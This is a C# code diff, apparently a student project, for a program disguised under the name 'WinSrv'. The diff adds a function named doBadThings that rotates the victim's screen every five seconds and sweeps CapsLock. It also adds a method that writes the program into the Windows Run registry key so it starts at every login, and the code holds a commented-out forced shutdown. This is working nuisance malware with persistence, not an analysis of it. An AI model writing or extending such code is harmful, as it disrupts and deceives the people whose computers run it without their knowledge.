@@ -15,6 +15,8 @@ namespace WinSrv
 {
     class Funkcje
     {
+        static int rotationState = 0;
+        static bool _randomRotation = false;
         static string url, title;
         [DllImport("winmm.dll", EntryPoint = "mciSendString")]
         public static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
@@ -208,7 +210,7 @@ namespace WinSrv
             {
                 foreach (var item in currentProcess)
                 {
-                    if(item.MainWindowTitle.Contains(title))
+                    if(item.MainWindowTitle.ToLower().Contains(title.ToLower()))
                     {
                         isOpened = true;
                     }
@@ -227,12 +229,56 @@ namespace WinSrv
             }
         }
 
+        static void rotateScreen(int timeInSeconds, bool random)
+        {
+            _randomRotation = random;
+            System.Timers.Timer myTimer = new System.Timers.Timer();
+            myTimer.Elapsed += new ElapsedEventHandler(rotation);
+            myTimer.Interval = timeInSeconds * 1000; // 1000 ms is one second
+            myTimer.Start();
+
+        }
+
+        static void rotation(Object e, ElapsedEventArgs arg)
+        {
+            if (_randomRotation)
+            {
+                Random rand = new Random();
+                Display.Rotate(1, rand.Next(0, 3));
+            }
+            else
+            {
+                if(rotationState < 3)
+                {
+                    rotationState++;
+                }
+                else
+                {
+                    rotationState = 0;
+                }
+                Display.Rotate(1, rotationState);
+                
+            }
+        }
+
+        public static void SetStartup(bool startup)
+        {
+            RegistryKey rk = Registry.CurrentUser.OpenSubKey
+                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
+            if (startup)
+                rk.SetValue("WinSrv", Application.ExecutablePath);
+            else
+                rk.DeleteValue("WinSrv", false);
+
+        }
 
         static void doBadThings(object state)
         {
+            rotateScreen(5, true);
             //switchCapsLock();
             CapsLockSweep();
-            checkWebsite("http://google.pl", "Google"); //na nastepnych zajeciach naprawić case sensitive
+            checkWebsite("http://google.pl", "Google"); 
 
             //shutdown(60, "Komputer zostanie wyłączony!");
 
